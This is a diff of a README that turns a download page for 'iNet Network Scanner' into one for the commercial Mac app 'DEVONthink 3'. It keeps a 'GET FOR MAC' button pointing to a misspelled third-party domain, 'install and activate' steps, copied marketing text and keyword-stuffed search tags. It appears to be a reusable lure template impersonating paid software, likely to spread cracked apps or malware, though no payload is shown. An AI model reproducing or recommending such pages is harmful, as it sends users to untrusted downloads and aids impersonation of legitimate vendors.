@@ -1,12 +1,12 @@
-# iNet Network Scanner – Advanced Network Analysis Tool 
+# DEVONthink 3 – Smart Document Management & Knowledge Organization
 
 <div align="center">  
-  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/d7/3c/32/d73c3292-3488-e23d-9dad-60f97027f5c2/Icon.png/1200x630bb.png" width="250"/>  
+  <img src="https://www.macsparky.com/wp-content/uploads/2023/05/Icon-DEVONthink.png" width="250"/>  
 </div>  
 <br>  
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-aplications.github.io/.github/inet)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-aplications.github.io/.github/devonthink)  
 
 </div>  
 
@@ -15,39 +15,40 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate iNet Network Scanner On Your Mac Device.  
+2. Follow The On-Screen Steps To Install And Activate DEVONthink 3 On Your Mac Device.  
 
 ---  
 
 <div align="center">  
-  <img src="https://inetapp.de/en/img/inet_mac_screenshots/inet-mac-airport1.jpg" width="1080"/>  
+  <img src="https://tidbits.com/uploads/2019/04/DEVONthink-3-screenshot.jpg" width="1080"/>  
 </div>  
 <br>  
 
 ## 🧩 Overview  
 
-**iNet Network Scanner for macOS** is a comprehensive utility designed to analyze, visualize, and secure your network. Developed by BananaGlue, it allows users to instantly discover all devices connected to their Wi-Fi or LAN, providing detailed insights into IP addresses, hostnames, MAC addresses, and connection types.  
+**DEVONthink 3 for macOS** is a powerful document management and information organization platform developed by **DEVONtechnologies**. Designed for professionals, researchers, writers, and knowledge workers, it provides a secure, intelligent way to collect, organize, annotate, and retrieve digital information in one unified space.  
 
-With its sleek and intuitive interface, iNet gives both professionals and home users an easy way to understand who and what is on their network. It identifies connected computers, routers, smartphones, printers, and IoT devices — helping you detect unauthorized access or hidden devices.  
+With advanced **AI-based classification**, DEVONthink automatically analyzes your content and suggests smart filing locations, making it effortless to maintain order even in massive databases. You can import documents, emails, PDFs, web archives, and notes — all searchable with lightning speed using advanced metadata filters, OCR, and Boolean operators.  
 
-The tool also offers advanced features such as Bonjour service detection, port scanning, wake-on-LAN support, and historical logging of network activity. For those managing complex setups, iNet supports VLAN, mesh, and bridge mode environments, providing a clear and organized overview of all network layers.  
+DEVONthink seamlessly integrates with macOS and Safari, supports Markdown, and allows you to link or cross-reference documents just like a personal knowledge graph. Its **end-to-end encryption** keeps your databases private, while **synchronization** via iCloud, Dropbox, or local networks ensures secure access across multiple Macs and iOS devices with **DEVONthink To Go**.  
 
-Optimized for macOS, iNet runs smoothly on both Intel and Apple Silicon chips. Its lightweight design and real-time scanning engine ensure quick results without unnecessary background load. Whether you’re troubleshooting connectivity issues, optimizing a router setup, or monitoring security, iNet Network Scanner provides reliable, professional-grade visibility for your network.  
+For users who handle large volumes of data, DEVONthink 3 is not just a file manager — it’s a **thinking assistant**, a **digital archive**, and a **research powerhouse** that evolves with your workflow.  
 
 ---  
 
 ## 🚀 Key Features  
 
-| Feature                                  | Description                                                                 |
-|------------------------------------------|------------------------------------------------------------------------------|
-| 🌐 **Smart Network Scanning**            | Instantly identifies all connected devices with detailed info.               |
-| 📡 **Wi-Fi & LAN Discovery**             | Works seamlessly across both wireless and wired networks.                    |
-| 🔍 **Port & Service Detection**          | Detects open ports and active Bonjour services for deeper insights.          |
-| 🧠 **Device Identification**             | Recognizes devices by manufacturer, IP, and MAC address.                     |
-| 💾 **Network History**                   | Keeps logs of all scanned networks and connected devices.                    |
-| ⚙️ **Advanced Tools**                    | Includes Wake-on-LAN, Ping, and Traceroute utilities.                        |
-| ⚡ **Optimized for Apple Silicon**        | Runs natively on M1/M2 Macs for high-speed performance.                      |
-| 🧱 **Security Awareness**                 | Helps detect unknown or unauthorized devices in your network.                |
+| Feature                                      | Description                                                                 |
+|----------------------------------------------|------------------------------------------------------------------------------|
+| 🧠 **AI-Powered Organization**               | Automatically classifies and suggests where to file documents.              |
+| 📂 **Flexible Database System**              | Store and manage unlimited documents, PDFs, emails, and web archives.       |
+| 🔍 **Full-Text & OCR Search**                | Instantly search inside scanned PDFs and images with built-in OCR.          |
+| ✏️ **Annotation & Tagging Tools**            | Highlight, comment, and tag files for better organization.                  |
+| 🌐 **Web & Email Integration**               | Capture web pages, links, and mail directly into DEVONthink.                |
+| 🔗 **Cross-Linking & Wiki Features**         | Create connections between related files and notes.                         |
+| ☁️ **Secure Sync & Encryption**              | Sync safely across devices via iCloud, Dropbox, or local networks.          |
+| 📱 **Companion App – DEVONthink To Go**      | Access and edit your databases on iPhone and iPad.                          |
+| ⚡ **Optimized for Apple Silicon**            | Natively supports M1/M2 chips for high performance and stability.           |
 
 ---  
 
@@ -55,14 +56,14 @@ Optimized for macOS, iNet runs smoothly on both Intel and Apple Silicon chips. I
 
 | Component     | Minimum Specifications            |
 |---------------|-----------------------------------|
-| OS            | macOS 10.13 or later              |
+| OS            | macOS 10.14 or later              |
 | Processor     | Apple Silicon (M1/M2) or Intel    |
-| Memory        | 2 GB RAM or higher                |
-| Storage       | 200 MB free disk space            |
+| Memory        | 4 GB RAM or higher                |
+| Storage       | 500 MB free disk space            |
 | Display       | 1280×800 resolution or higher     |
 
 ---  
 
 ## 🏷️ Tags  
 
-inet inet mac inet scanner bananaglue inet network scanner inet network scanner mac inet network gl inet mini smart router inet internet gl inet 300m mini smart router gl inet adguard gl inet bridge mode gl inet brume gl inet captive portal gl inet default password gl inet mesh gl inet poe gl inet repeater gl inet vlan gl inet setup glinet wireguard glinet openwrt inets e openwrt glinet  
+devonthink to go • devonthink download • devonthink pro 3 • devonthink pricing • devon think pro • devonthink 3 download • devonthink 3 pro • devonthink 3 review • devonthink and obsidian • devonthink m1 • devonthink pro download • devonthink safari • devonthink ventura • devonthink 3 mac • devonthink 3 macos • devonthink 3 for mac • devonthink 3 • devontechnologies • devonthink 4 • devonthink • devonthink pro • devonthink mac • devonthink3 • devon think 3  
